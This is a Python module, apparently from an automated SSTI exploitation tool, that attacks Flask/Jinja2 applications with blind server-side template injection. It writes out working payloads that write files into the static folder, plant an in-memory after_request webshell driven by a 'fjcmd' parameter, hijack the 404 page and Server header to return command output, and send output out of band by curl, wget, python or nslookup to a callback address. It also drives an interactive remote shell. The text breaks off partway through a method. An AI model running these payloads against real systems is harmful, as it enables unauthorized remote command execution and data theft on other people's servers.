"""无回显（盲）SSTI自动利用模块

按顺序自动尝试以下利用方式，每一步成功即停并报告结果：
1. 写文件到static目录，通过访问静态文件获得回显
2. 注入Flask after_request内存马，获得交互shell
3. 污染错误页（NotFound.description）获得回显，进入交互shell
4. 污染Server响应头获得单行回显
5. OOB带外回显（对接self-hosted interactsh自动注册轮询，或使用用户自备回调地址）

设计要点：
- 验证请求与注入请求复用同一个HTTPRequester的session，
  自动继承Cookie/Header/代理/verify=False/重试/interval
- 每一步验证都会重复多次（默认5次），容忍多进程（多worker）目标上
  注入只命中部分worker的情况
- 所有持久化污染都尽量还原：static canary验证后即删除，
  错误页/Server头先备份原值到_fj_orig属性、退出时还原，
  内存马支持?fjunhook=1卸载；同时日志给出手动清理方法兜底

若目标有回显、能按现有流程探测出WAF，则固定payload会交给
FullPayloadGen生成绕过版本；否则退化为直接发送原始payload。
"""

import base64
import html
import json
import logging
import random
import re
import string
import time
from pathlib import Path
from typing import Union, Tuple, Callable, List
from urllib.parse import urlparse

from rich.markup import escape as rich_escape

from .const import EVAL, STRING
from .form import Form
from .full_payload_gen import FullPayloadGen
from .options import Options
from .pbar import console, pbar_manager
from .requester import HTTPRequester
from .submitter import FormSubmitter, shell_tamperer, Submitter

logger = logging.getLogger("blind")

# 每次注入后重复验证的次数，容忍多进程目标上请求打到未注入的worker
DEFAULT_VERIFY_TIMES = 5


def gen_canary() -> str:
    """生成随机校验字符串，只用字母数字避免被转义/WAF影响

    Returns:
        str: 随机canary
    """
    return "FJ" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))


def gen_rand(k: int = 6) -> str:
    """生成随机小写字母串

    Args:
        k (int): 长度

    Returns:
        str: 随机字符串
    """
    return "".join(random.choices(string.ascii_lowercase, k=k))


# ---------------- 第1步：写文件到static目录 ----------------
# py版本供FullPayloadGen的EVAL目标使用，raw版本为无WAF探测能力时直接发送的原始payload
WRITE_STATIC_VARIANTS = [
    (
        "相对路径shell写入",
        "__import__('os').popen('echo <CANARY> > static/<FNAME>').read()",
        "{{lipsum.__globals__['os'].popen('echo <CANARY> > static/<FNAME>').read()}}",
    ),
    (
        "current_app.static_folder绝对路径写入",
        "open(__import__('os').path.join(__import__('flask').current_app.static_folder, "
        "'<FNAME>'), 'w').write('<CANARY>')",
        "{{url_for.__globals__['__builtins__']['open']"
        "(url_for.__globals__['__builtins__']['__import__']('os').path.join"
        "(url_for.__globals__['current_app'].static_folder,'<FNAME>'),'w')"
        ".write('<CANARY>')}}",
    ),
    (
        "getcwd拼接static绝对路径写入",
        "open(__import__('os').path.join(__import__('os').getcwd(), 'static', "
        "'<FNAME>'), 'w').write('<CANARY>')",
        "{{url_for.__globals__['__builtins__']['open']"
        "(url_for.__globals__['__builtins__']['__import__']('os').path.join"
        "(url_for.__globals__['__builtins__']['__import__']('os').getcwd(),'static','<FNAME>'),'w')"
        ".write('<CANARY>')}}",
    ),
]

# 与WRITE_STATIC_VARIANTS一一对应的清理payload（验证成功后删除canary文件）
REMOVE_STATIC_VARIANTS = [
    (
        "__import__('os').remove('static/<FNAME>') "
        "if __import__('os').path.exists('static/<FNAME>') else None",
        "{{lipsum.__globals__['os'].remove('static/<FNAME>') "
        "if lipsum.__globals__['os'].path.exists('static/<FNAME>') else None}}",
    ),
    (
        "__import__('os').remove(__import__('os').path.join"
        "(__import__('flask').current_app.static_folder, '<FNAME>')) "
        "if __import__('os').path.exists(__import__('os').path.join"
        "(__import__('flask').current_app.static_folder, '<FNAME>')) else None",
        "{{(url_for.__globals__['__builtins__']['__import__']('os').remove"
        "(url_for.__globals__['__builtins__']['__import__']('os').path.join"
        "(url_for.__globals__['current_app'].static_folder,'<FNAME>')) "
        "if url_for.__globals__['__builtins__']['__import__']('os').path.exists"
        "(url_for.__globals__['__builtins__']['__import__']('os').path.join"
        "(url_for.__globals__['current_app'].static_folder,'<FNAME>')) else None)}}",
    ),
    (
        "__import__('os').remove(__import__('os').path.join"
        "(__import__('os').getcwd(), 'static', '<FNAME>')) "
        "if __import__('os').path.exists(__import__('os').path.join"
        "(__import__('os').getcwd(), 'static', '<FNAME>')) else None",
        "{{(url_for.__globals__['__builtins__']['__import__']('os').remove"
        "(url_for.__globals__['__builtins__']['__import__']('os').path.join"
        "(url_for.__globals__['__builtins__']['__import__']('os').getcwd(),'static','<FNAME>')) "
        "if url_for.__globals__['__builtins__']['__import__']('os').path.exists"
        "(url_for.__globals__['__builtins__']['__import__']('os').path.join"
        "(url_for.__globals__['__builtins__']['__import__']('os').getcwd(),'static','<FNAME>')) "
        "else None)}}",
    ),
]

# ---------------- 第2步：注入内存马（Flask after_request钩子） ----------------
# 钩子：带fjunhook参数时从after_request_funcs中pop掉自己（卸载），
# 带fjcmd参数（GET或POST form）时替换响应为命令执行结果，否则原样返回
MEMSHELL_HOOK_PY = (
    "(lambda resp: "
    "(__import__('flask').current_app.after_request_funcs.setdefault(None, []).pop() and resp)"
    " if __import__('flask').request.args.get('fjunhook')"
    " else (__import__('flask').make_response(__import__('os').popen("
    "(__import__('flask').request.form.get('fjcmd')"
    " or __import__('flask').request.args.get('fjcmd'))).read())"
    " if (__import__('flask').request.form.get('fjcmd')"
    " or __import__('flask').request.args.get('fjcmd')) else resp))"
)
# py版本A：直接用flask.current_app定位app
MEMSHELL_PY_MAIN = (
    "__import__('flask').current_app.after_request_funcs.setdefault(None, [])"
    ".append(" + MEMSHELL_HOOK_PY + ")"
)
# py版本B：遍历sys.modules寻找带app属性的模块
MEMSHELL_PY_SCAN = (
    "[m.app.after_request_funcs.setdefault(None, []).append(" + MEMSHELL_HOOK_PY + ")"
    " for m in list(__import__('sys').modules.values())"
    " if hasattr(m, 'app') and hasattr(getattr(m, 'app', None), 'after_request_funcs')]"
)
# raw版本的内层python代码，经eval执行，app/request由eval的globals传入
_MEMSHELL_RAW_INNER = (
    r"""app.after_request_funcs.setdefault(None, []).append(lambda resp: """
    r"""(app.after_request_funcs[None].pop() and resp) if request.args.get('fjunhook') else """
    r"""(CmdResp if (request.form.get('fjcmd') or request.args.get('fjcmd')) and """
    r"""exec(\"global CmdResp;CmdResp=__import__('flask').make_response("""
    r"""__import__('os').popen((request.form.get('fjcmd') or request.args.get('fjcmd'))"""
    r""").read())\")==None else resp))"""
)
# raw版本A：__main__中的app（已在真实靶机验证）
MEMSHELL_RAW_MAIN = (
    "{{url_for.__globals__['__builtins__']['eval'](\""
    + _MEMSHELL_RAW_INNER
    + "\",{'request':url_for.__globals__['request'],"
    "'app':url_for.__globals__['sys'].modules['__main__'].__dict__['app']})}}"
)
# raw版本B：遍历模块版本，防止__main__不是应用模块
MEMSHELL_RAW_SCAN = (
    r"""{% for m in url_for.__globals__['sys'].modules.values() %}"""
    r"""{% if m.app is defined %}"""
    "{{url_for.__globals__['__builtins__']['eval'](\""
    + _MEMSHELL_RAW_INNER
    + "\",{'request':url_for.__globals__['request'],'app':m.app})}}"
    r"""{% endif %}{% endfor %}"""
)
MEMSHELL_VARIANTS = [
    ("直接定位app", MEMSHELL_PY_MAIN, MEMSHELL_RAW_MAIN),
    ("遍历模块定位app", MEMSHELL_PY_SCAN, MEMSHELL_RAW_SCAN),
]

# ---------------- 第3步：错误页污染回显 ----------------
# 污染前先把原description备份到NotFound._fj_orig属性，便于之后还原
ERRORPAGE_PY = (
    "(setattr(__import__('sys').modules['werkzeug.exceptions'].NotFound, '_fj_orig', "
    "getattr(__import__('sys').modules['werkzeug.exceptions'].NotFound, 'description', None)), "
    "setattr(__import__('sys').modules['werkzeug.exceptions'].NotFound, 'description', "
    "__import__('os').popen('echo <CANARY>').read()))[1]"
)
# raw版本A：经lipsum.__spec__链（旧版jinja2，已在真实靶机验证）
ERRORPAGE_RAW_LIPSUM = (
    "{{(url_for.__globals__.__builtins__['setattr']"
    "(lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.exceptions.NotFound,"
    "'_fj_orig',lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.exceptions.NotFound"
    ".description),"
    "url_for.__globals__.__builtins__['setattr']"
    "(lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.exceptions.NotFound,"
    "'description',url_for.__globals__.__builtins__['__import__']('os')"
    ".popen('echo <CANARY>').read()))[1]}}"
)
# raw版本B：经url_for.__globals__['sys']链（新版jinja2中lipsum没有__spec__）
ERRORPAGE_RAW_URLFOR = (
    "{{(url_for.__globals__['__builtins__']['setattr']"
    "(url_for.__globals__['sys'].modules.werkzeug.exceptions.NotFound,"
    "'_fj_orig',url_for.__globals__['sys'].modules.werkzeug.exceptions.NotFound.description),"
    "url_for.__globals__['__builtins__']['setattr']"
    "(url_for.__globals__['sys'].modules.werkzeug.exceptions.NotFound,"
    "'description',url_for.__globals__['__builtins__']['__import__']('os')"
    ".popen('echo <CANARY>').read()))[1]}}"
)
ERRORPAGE_RAW_VARIANTS = [
    ("lipsum.__spec__链", ERRORPAGE_RAW_LIPSUM),
    ("url_for sys链", ERRORPAGE_RAW_URLFOR),
]
# 错误页shell每次注入时用的payload，命令经base64编码传递避免引号转义问题，
# 用FJBLINDSTART/END包裹命令输出方便提取
ERRORPAGE_SHELL_PY = (
    "setattr(__import__('sys').modules['werkzeug.exceptions'].NotFound, "
    "'description', 'FJBLINDSTART' + __import__('os').popen("
    "__import__('base64').b64decode('<B64>').decode()).read() + 'FJBLINDEND')"
)
ERRORPAGE_SHELL_RAW = (
    "{{url_for.__globals__['__builtins__']['setattr']"
    "(url_for.__globals__['sys'].modules.werkzeug.exceptions.NotFound,"
    "'description','FJBLINDSTART'+url_for.__globals__['__builtins__']['__import__']('os')"
    ".popen(url_for.__globals__['__builtins__']['__import__']('base64')"
    ".b64decode('<B64>').decode()).read()+'FJBLINDEND')}}"
)
# 还原payload：把备份在_fj_orig中的原description写回并删除备份属性
ERRORPAGE_RESTORE_PY = (
    "(setattr(__import__('sys').modules['werkzeug.exceptions'].NotFound, 'description', "
    "getattr(__import__('sys').modules['werkzeug.exceptions'].NotFound, '_fj_orig', None)), "
    "(delattr(__import__('sys').modules['werkzeug.exceptions'].NotFound, '_fj_orig') "
    "if hasattr(__import__('sys').modules['werkzeug.exceptions'].NotFound, '_fj_orig') "
    "else None))[1]"
)
ERRORPAGE_RESTORE_RAW = (
    "{{(url_for.__globals__['__builtins__']['setattr']"
    "(url_for.__globals__['sys'].modules.werkzeug.exceptions.NotFound,'description',"
    "url_for.__globals__['__builtins__']['getattr']"
    "(url_for.__globals__['sys'].modules.werkzeug.exceptions.NotFound,'_fj_orig',None)),"
    "(url_for.__globals__['__builtins__']['delattr']"
    "(url_for.__globals__['sys'].modules.werkzeug.exceptions.NotFound,'_fj_orig') "
    "if url_for.__globals__['__builtins__']['hasattr']"
    "(url_for.__globals__['sys'].modules.werkzeug.exceptions.NotFound,'_fj_orig') "
    "else None))[1]}}"
)

# ---------------- 第4步：Server响应头回显（只能单行输出） ----------------
SERVERHEADER_PY = (
    "(setattr(__import__('sys').modules['werkzeug.serving'].WSGIRequestHandler, '_fj_orig', "
    "getattr(__import__('sys').modules['werkzeug.serving'].WSGIRequestHandler, "
    "'server_version', None)), "
    "setattr(__import__('sys').modules['werkzeug.serving'].WSGIRequestHandler, "
    "'server_version', __import__('os').popen('echo <CANARY>').read()))[1]"
)
SERVERHEADER_RAW_LIPSUM = (
    "{{(lipsum.__globals__.__builtins__.setattr"
    "(lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"
    "'_fj_orig',lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.serving"
    ".WSGIRequestHandler.server_version),"
    "lipsum.__globals__.__builtins__.setattr"
    "(lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"
    "'server_version',lipsum.__globals__.__builtins__.__import__('os')"
    ".popen('echo <CANARY>').read()))[1]}}"
)
SERVERHEADER_RAW_URLFOR = (
    "{{(url_for.__globals__['__builtins__']['setattr']"
    "(url_for.__globals__['sys'].modules.werkzeug.serving.WSGIRequestHandler,"
    "'_fj_orig',url_for.__globals__['sys'].modules.werkzeug.serving.WSGIRequestHandler"
    ".server_version),"
    "url_for.__globals__['__builtins__']['setattr']"
    "(url_for.__globals__['sys'].modules.werkzeug.serving.WSGIRequestHandler,"
    "'server_version',url_for.__globals__['__builtins__']['__import__']('os')"
    ".popen('echo <CANARY>').read()))[1]}}"
)
SERVERHEADER_RAW_VARIANTS = [
    ("lipsum.__spec__链", SERVERHEADER_RAW_LIPSUM),
    ("url_for sys链", SERVERHEADER_RAW_URLFOR),
]
SERVERHEADER_RESTORE_PY = (
    "(setattr(__import__('sys').modules['werkzeug.serving'].WSGIRequestHandler, "
    "'server_version', getattr("
    "__import__('sys').modules['werkzeug.serving'].WSGIRequestHandler, "
    "'_fj_orig', 'Werkzeug')), "
    "(delattr(__import__('sys').modules['werkzeug.serving'].WSGIRequestHandler, '_fj_orig') "
    "if hasattr(__import__('sys').modules['werkzeug.serving'].WSGIRequestHandler, '_fj_orig') "
    "else None))[1]"
)
SERVERHEADER_RESTORE_RAW = (
    "{{(url_for.__globals__['__builtins__']['setattr']"
    "(url_for.__globals__['sys'].modules.werkzeug.serving.WSGIRequestHandler,"
    "'server_version',url_for.__globals__['__builtins__']['getattr']"
    "(url_for.__globals__['sys'].modules.werkzeug.serving.WSGIRequestHandler,"
    "'_fj_orig','Werkzeug')),"
    "(url_for.__globals__['__builtins__']['delattr']"
    "(url_for.__globals__['sys'].modules.werkzeug.serving.WSGIRequestHandler,'_fj_orig') "
    "if url_for.__globals__['__builtins__']['hasattr']"
    "(url_for.__globals__['sys'].modules.werkzeug.serving.WSGIRequestHandler,'_fj_orig') "
    "else None))[1]}}"
)

# ---------------- 第5步：OOB带外 ----------------
# shell模板，<ADDR>为回调地址，<CMD>为要带出数据的命令
# base64后接tr -d '\n'而非-w0，兼容没有-w选项的BusyBox base64
OOB_SHELL_VARIANTS = [
    ("curl HTTP带外", "curl http://<ADDR>/`<CMD> | base64 | tr -d '\\n'`"),
    ("wget HTTP带外", "wget -q -O /dev/null http://<ADDR>/`<CMD> | base64 | tr -d '\\n'`"),
    (
        "python3 HTTP带外",
        "python3 -c \"import base64,subprocess,urllib.request;"
        "urllib.request.urlopen('http://<ADDR>/'+base64.b64encode"
        "(subprocess.getoutput('<CMD>').encode()).decode())\"",
    ),
    (
        "python HTTP带外",
        "python -c \"import base64,subprocess,urllib.request;"
        "urllib.request.urlopen('http://<ADDR>/'+base64.b64encode"
        "(subprocess.getoutput('<CMD>').encode()).decode())\"",
    ),
    # DNS带外：数据hex编码后作为子域名（截断到60字符保证DNS标签合法），
    # 用od而非xxd/base32，BusyBox也有od
    (
        "DNS带外(hex)",
        "nslookup `<CMD> | od -An -v -tx1 | tr -d ' \\n' | cut -c1-60`.<ADDR>",
    ),
]
OOB_RAW_TEMPLATE = (
    "{{cycler.__init__.__globals__.os.popen("
    "url_for.__globals__['__builtins__']['__import__']('base64')"
    ".b64decode('<SHELLB64>').decode()).read()}}"
)

# ---------------- 开局模板引擎指纹探测 ----------------
FINGERPRINT_PROBES = [
    ("Jinja2/Twig ({{7*7}})", "{{7*7}}", "49"),
    ("FreeMarker (${7*7})", "${7*7}", "49"),
    ("Ruby/JS (#{7*7})", "#{7*7}", "49"),
    ("ERB/ASP (<%= 7*7 %>)", "<%= 7*7 %>", "49"),
]


def build_oob_payloads(addr: str, cmd: str) -> List[Tuple[str, str, str]]:
    """根据回调地址和命令生成OOB payload变体列表

    Args:
        addr (str): 回调地址（不含协议前缀）
        cmd (str): 要带出数据的命令

    Returns:
        List[Tuple[str, str, str]]: (名称, py代码, raw payload)列表
    """
    variants = []
    for name, shell_template in OOB_SHELL_VARIANTS:
        shell = shell_template.replace("<ADDR>", addr).replace("<CMD>", cmd)
        py_code = "__import__('os').popen(" + repr(shell) + ").read()"
        shell_b64 = base64.b64encode(shell.encode()).decode()
        variants.append((name, py_code, OOB_RAW_TEMPLATE.replace("<SHELLB64>", shell_b64)))
    return variants


class BlindAttacker:
    """无回显SSTI自动利用器"""

    def __init__(
        self,
        url: str,
        submitter: Submitter,
        full_payload_gen: Union[FullPayloadGen, None] = None,
        timeout: int = 8,
        requester: Union[HTTPRequester, None] = None,
        static_path: str = "",
        verify_times: int = DEFAULT_VERIFY_TIMES,
    ):
        """传入目标URL、payload提交器和可选的payload生成器

        Args:
            url (str): 目标URL
            submitter (Submitter): 提交payload的submitter
            full_payload_gen (Union[FullPayloadGen, None]): WAF绕过payload生成器，
                为None时直接发送原始payload
            timeout (int): 验证请求的超时时间
            requester (Union[HTTPRequester, None]): 复用其session发送验证请求，
                为None时尝试取submitter的req，再退化为新建HTTPRequester
            static_path (str): 非默认/static/挂载时的静态文件URL前缀
            verify_times (int): 每步注入后的重复验证次数（容忍多worker未命中）
        """
        self.url = url
        self.submitter = submitter
        self.full_payload_gen = full_payload_gen
        self.timeout = timeout
        self.requester = requester or getattr(submitter, "req", None) or HTTPRequester()
        self.static_path = static_path
        self.verify_times = verify_times
        # 成功后记录的信息，供测试和使用者检查
        self.static_file_url = ""
        self.last_canary = ""
        # 结构化结果，--output时写为JSON
        self.results = {
            "url": url,
            "fingerprint": {},
            "steps": {},
            "success_step": "",
            "static_file_url": "",
            "canary": "",
            "oob": {},
        }

    # ---------------- 基础能力 ----------------

    def gen_payload(self, py_code: str, raw_payload: str) -> str:
        """优先使用FullPayloadGen生成绕过WAF的payload，失败则退化为原始payload

        Args:
            py_code (str): 等价的python代码，交给EVAL目标生成绕过版本
            raw_payload (str): 原始的固定payload

        Returns:
            str: 最终提交的payload
        """
        if self.full_payload_gen is not None:
            try:
                payload, _ = self.full_payload_gen.generate(EVAL, (STRING, py_code))
            except Exception as e:  # pylint: disable=broad-except
                logger.warning("Generate bypass payload failed: %s", e)
                payload = None
            if payload:
                return payload
            logger.warning(
                "[yellow]Bypass payload generation failed, "
                "falling back to raw payload[/]",
                extra={"markup": True, "highlighter": None},
            )
        return raw_payload

    def submit_payload(self, payload: str) -> bool:
        """提交payload到目标

        Args:
            payload (str): payload

        Returns:
            bool: 是否成功提交（不保证执行成功）
        """
        logger.info(
            "Submit payload [blue]%s[/]",
            rich_escape(payload),
            extra={"markup": True, "highlighter": None},
        )
        try:
            resp = self.submitter.submit(payload)
        except Exception as e:  # pylint: disable=broad-except
            logger.warning("Submit failed: %s", e, extra={"highlighter": None})
            return False
        return resp is not None

    def http_get(self, url: str, params: Union[dict, None] = None):
        """发送GET请求用于验证结果，复用requester的session
        （自动携带Cookie/Header/代理，继承重试与interval）

        Args:
            url (str): URL
            params (Union[dict, None]): GET参数

        Returns:
            Union[requests.Response, None]: 响应
        """
        return self.requester.request(method="GET", url=url, params=params or {})

    def http_post(self, url: str, data: Union[dict, None] = None):
        """发送POST请求用于验证结果，复用requester的session

        Args:
            url (str): URL
            data (Union[dict, None]): POST表单

        Returns:
            Union[requests.Response, None]: 响应
        """
        return self.requester.request(method="POST", url=url, data=data or {})

    def verify_loop(self, check: Callable[[], bool], what: str = "") -> bool:
        """重复验证直到通过或次数耗尽，容忍多进程目标上请求命中未注入的worker

        Args:
            check (Callable[[], bool]): 验证函数
            what (str): 验证内容描述，用于日志

        Returns:
            bool: 是否验证通过
        """
        for i in range(self.verify_times):
            try:
                if check():
                    return True
            except Exception as e:  # pylint: disable=broad-except
                logger.warning("验证请求出错: %s", e, extra={"highlighter": None})
            if i < self.verify_times - 1:
                time.sleep(0.5)
        if self.verify_times > 1:
            logger.warning(
                "[yellow]%s 重复验证%d次仍未通过。如果目标以多进程（多worker）方式运行，"
                "注入可能只命中了其中一个worker，建议重试或在单worker环境验证[/]",
                what,
                self.verify_times,
                extra={"markup": True, "highlighter": None},
            )
        return False

    def static_url_candidates(self, fname: str) -> List[str]:
        """生成canary静态文件的候选URL，覆盖子路径挂载和自定义static前缀

        Args:
            fname (str): 文件名

        Returns:
            List[str]: 候选URL列表（去重）
        """
        parsed = urlparse(self.url)
        root = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path
        base_dir = path[: path.rfind("/") + 1] if "/" in path else "/"
        candidates = []
        if self.static_path:
            sp = self.static_path
            if sp.startswith(("http://", "https://")):
                candidates.append(sp.rstrip("/") + "/" + fname)
            else:
                candidates.append(root + "/" + sp.strip("/") + "/" + fname)
        # 相对当前路径目录（子路径挂载时static在应用前缀下）
        candidates.append(root + base_dir + "static/" + fname)
        # 站点根目录下的/static/
        candidates.append(root + "/static/" + fname)
        return list(dict.fromkeys(candidates))

    def probe_engine(self) -> None:
        """开局模板引擎指纹探测：发送各引擎的算术表达式，看响应里是否出现计算结果"""
        logger.info(
            "[yellow]先做模板引擎指纹探测（无回显目标可能全部无结果）...[/]",
            extra={"markup": True, "highlighter": None},
        )
        for name, pattern, expect in FINGERPRINT_PROBES:
            try:
                resp = self.submitter.submit(pattern)
            except Exception:  # pylint: disable=broad-except
                resp = None
            hit = resp is not None and expect in resp.text
            self.results["fingerprint"][name] = hit
            if hit:
                logger.info(
                    "[green]指纹命中: %s（响应中出现计算结果%s）[/]",
                    name,
                    expect,
                    extra={"markup": True, "highlighter": None},
                )
        if not any(self.results["fingerprint"].values()):
            logger.info(
                "[yellow]所有指纹均无回显，无法确认模板引擎，将按Jinja2/Flask假设继续[/]",
                extra={"markup": True, "highlighter": None},
            )

    # ---------------- 第1步：写static ----------------

    def step_write_static(self) -> bool:
        """第1步：写canary文件到static目录并访问验证，验证成功后立即删除canary文件

        Returns:
            bool: 是否成功
        """
        for variant_idx, (name, py_template, raw_template) in enumerate(
            WRITE_STATIC_VARIANTS
        ):
            canary = gen_canary()
            fname = f"fj_{gen_rand()}.txt"
            logger.info(
                "尝试写文件方式: [blue]%s[/]",
                name,
                extra={"markup": True, "highlighter": None},
            )
            py_code = py_template.replace("<CANARY>", canary).replace("<FNAME>", fname)
            raw_payload = raw_template.replace("<CANARY>", canary).replace(
                "<FNAME>", fname
            )
            if not self.submit_payload(self.gen_payload(py_code, raw_payload)):
                continue
            for file_url in self.static_url_candidates(fname):
                resp = self.http_get(file_url)
                if resp is not None and canary in resp.text:
                    self.static_file_url = file_url
                    self.last_canary = canary
                    self.results["static_file_url"] = file_url
                    self.results["canary"] = canary
                    self.results["steps"]["write_static"] = {
                        "variant": name,
                        "file_url": file_url,
                        "canary": canary,
                    }
                    logger.info(
                        "[green bold]写文件成功！[/] [blue]%s[/] 包含canary [cyan]%s[/]",
                        rich_escape(file_url),
                        canary,
                        extra={"markup": True, "highlighter": None},
                    )
                    self.cleanup_static(variant_idx, fname)
                    return True
        return False

    def cleanup_static(self, variant_idx: int, fname: str) -> None:
        """删除写入的canary文件（尽力而为），并给出手动清理方法兜底

        Args:
            variant_idx (int): 写入时使用的变体序号
            fname (str): 文件名
        """
        py_code, raw_payload = (
            REMOVE_STATIC_VARIANTS[variant_idx][0].replace("<FNAME>", fname),
            REMOVE_STATIC_VARIANTS[variant_idx][1].replace("<FNAME>", fname),
        )
        removed = self.submit_payload(self.gen_payload(py_code, raw_payload))
        confirm = self.http_get(self.static_file_url)
        if removed and confirm is not None and confirm.status_code == 404:
            logger.info(
                "[green]canary文件 [blue]%s[/] 已删除[/]",
                fname,
                extra={"markup": True, "highlighter": None},
            )
        else:
            logger.warning(
                "[yellow]canary文件可能未被删除，请手动清理目标static目录下的 [blue]%s[/][/]",
                fname,
                extra={"markup": True, "highlighter": None},
            )

    # ---------------- 第2步：内存马 ----------------

    def step_memory_shell(self) -> bool:
        """第2步：注入Flask after_request内存马并用fjcmd参数验证（重复验证容忍多worker）

        Returns:
            bool: 是否成功
        """
        for name, py_code, raw_payload in MEMSHELL_VARIANTS:
            logger.info(
                "尝试内存马注入方式: [blue]%s[/]",
                name,
                extra={"markup": True, "highlighter": None},
            )
            if not self.submit_payload(self.gen_payload(py_code, raw_payload)):
                continue
            canary = gen_canary()

            def check():
                resp = self.http_get(self.url, params={"fjcmd": f"echo {canary}"})
                return resp is not None and canary in resp.text

            if self.verify_loop(check, "内存马验证"):
                self.last_canary = canary
                self.results["canary"] = canary
                self.results["steps"]["memory_shell"] = {
                    "variant": name,
                    "usage": f"POST {self.url} data: fjcmd=<命令>",
                }
                logger.info(
                    "[green bold]内存马注入成功！[/] "
                    "之后POST [blue]%s[/] （表单参数fjcmd=<命令>）或访问 "
                    "[blue]%s?fjcmd=<命令>[/] 即可执行命令",
                    rich_escape(self.url),
                    rich_escape(self.url),
                    extra={"markup": True, "highlighter": None},
                )
                logger.info(
                    "[yellow]卸载方法：访问 %s?fjunhook=1 （多worker目标需重复几次）；"
                    "若卸载失败请重启目标应用手动清理[/]",
                    self.url,
                    extra={"markup": True, "highlighter": None},
                )
                return True
        return False

    def unhook_memshell(self) -> bool:
        """卸载内存马：反复触发fjunhook直到fjcmd失效

        Returns:
            bool: 是否卸载成功
        """
        for _ in range(max(3, self.verify_times)):
            self.http_get(self.url, params={"fjunhook": "1"})
            canary = gen_canary()
            resp = self.http_get(self.url, params={"fjcmd": f"echo {canary}"})
            if resp is None or canary not in resp.text:
                logger.info(
                    "[green]内存马已卸载[/]", extra={"markup": True, "highlighter": None}
                )
                return True
        logger.warning(
            "[yellow]内存马卸载失败（可能是多worker目标仍有残留hook），"
            "请重启目标应用手动清理[/]",
            extra={"markup": True, "highlighter": None},
        )
        return False

    def memshell_loop(self):
        """内存马成功后的交互shell：循环读命令，POST body传fjcmd执行并展示结果，
        退出时自动卸载内存马"""
        console.print(
            "[green bold]进入内存马交互shell[/]，输入exit或按Ctrl+D退出（退出时自动卸载内存马）"
        )
        baseline_resp = self.http_get(self.url)
        baseline = baseline_resp.text if baseline_resp is not None else None
        try:
            while True:
                try:
                    cmd = console.input("[bold green]blind-shell> [/]")
                except (EOFError, KeyboardInterrupt):
                    break
                cmd = cmd.strip()
                if not cmd:
                    continue
                if cmd in ("exit", "quit"):
                    break
                resp = self.http_post(self.url, data={"fjcmd": cmd})
                if resp is None:
                    continue
                if baseline is not None and resp.text == baseline:
                    logger.warning(
                        "[yellow]响应与正常页面相同，可能命中了未注入内存马的worker"
                        "（多进程目标），建议重试几次或重新注入[/]",
                        extra={"markup": True, "highlighter": None},
                    )
                    continue
                console.print(resp.text.rstrip())
        finally:
            console.print("正在卸载内存马...")
            self.unhook_memshell()
            console.print("Bye!")

    # ---------------- 第3步：错误页污染 ----------------

    def step_error_page(self) -> bool:
        """第3步：污染NotFound错误页的description并访问404路径验证（重复验证容忍多worker）

        Returns:
            bool: 是否成功
        """
        for name, raw_template in ERRORPAGE_RAW_VARIANTS:
            canary = gen_canary()
            logger.info(
                "尝试错误页污染方式: [blue]%s[/]",
                name,
                extra={"markup": True, "highlighter": None},
            )
            py_code = ERRORPAGE_PY.replace("<CANARY>", canary)
            raw_payload = raw_template.replace("<CANARY>", canary)
            if not self.submit_payload(self.gen_payload(py_code, raw_payload)):
                continue
            notfound_url = self._random_404_url()

            def check():
                resp = self.http_get(notfound_url)
                return resp is not None and canary in html.unescape(resp.text)

            if self.verify_loop(check, "错误页污染验证"):
                self.last_canary = canary
                self.results["canary"] = canary
                self.results["steps"]["error_page"] = {"variant": name}
                logger.info(
                    "[green bold]错误页污染成功！[/] 404页面的description已包含canary",
                    extra={"markup": True, "highlighter": None},
                )
                logger.info(
                    "[yellow]原description已备份到NotFound._fj_orig，退出交互shell时自动还原；"
                    "若还原失败请重启目标应用手动清理[/]",
                    extra={"markup": True, "highlighter": None},
                )
                return True
        return False

    def _random_404_url(self) -> str:
        """生成一个必然404的URL（保留url路径前缀）"""
        parsed = urlparse(self.url)
        root = f"{parsed.scheme}://{parsed.netloc}"
        return root + "/fj_no_such_page_" + gen_rand()

    def restore_error_page(self) -> bool:
        """还原错误页污染：把_fj_orig中的原description写回

        Returns:
            bool: 是否还原成功
        """
        ok = self.submit_payload(
            self.gen_payload(ERRORPAGE_RESTORE_PY, ERRORPAGE_RESTORE_RAW)
        )
        if ok:
            resp = self.http_get(self._random_404_url())
            if resp is not None and "FJBLINDSTART" not in html.unescape(resp.text):
                logger.info(
                    "[green]错误页description已还原[/]",
                    extra={"markup": True, "highlighter": None},
                )
                return True
        logger.warning(
            "[yellow]错误页还原未能确认，请重启目标应用手动清理[/]",
            extra={"markup": True, "highlighter": None},
        )
        return False

    def errorpage_loop(self):
        """错误页污染成功后的交互shell：注入命令→访问404→提取description展示，
        命令经base64编码传递，退出时自动还原description"""
        console.print(
            "[green bold]进入错误页回显交互shell[/]，输入exit或按Ctrl+D退出（退出时自动还原错误页）"
        )
        notfound_url = self._random_404_url()
        try:
            while True:
                try:
                    cmd = console.input("[bold green]blind-shell> [/]")
                except (EOFError, KeyboardInterrupt):
                    break
                cmd = cmd.strip()
                if not cmd:
                    continue
                if cmd in ("exit", "quit"):
                    break
                cmd_b64 = base64.b64encode(cmd.encode()).decode()
                py_code = ERRORPAGE_SHELL_PY.replace("<B64>", cmd_b64)
                raw_payload = ERRORPAGE_SHELL_RAW.replace("<B64>", cmd_b64)
                if not self.submit_payload(self.gen_payload(py_code, raw_payload)):
                    continue
                resp = self.http_get(notfound_url)
                if resp is None:
                    continue
                text = html.unescape(resp.text)
                match = re.search(r"FJBLINDSTART(.*?)FJBLINDEND", text, re.DOTALL)
                if match:
                    console.print(match.group(1).rstrip())
                else:
                    logger.warning(
                        "[yellow]未能从错误页中提取结果，可能命中了未污染的worker"
                        "（多进程目标），请重试；以下为完整响应：[/]",
                        extra={"markup": True, "highlighter": None},
                    )
                    console.print(text.rstrip())
        finally:
            console.print("正在还原错误页...")
            self.restore_error_page()
            console.print("Bye!")

    # ---------------- 第4步：Server头污染 ----------------

    def step_server_header(self) -> bool:
        """第4步：污染Server响应头并验证（前置探测Server头是否为Werkzeug）

        Returns:
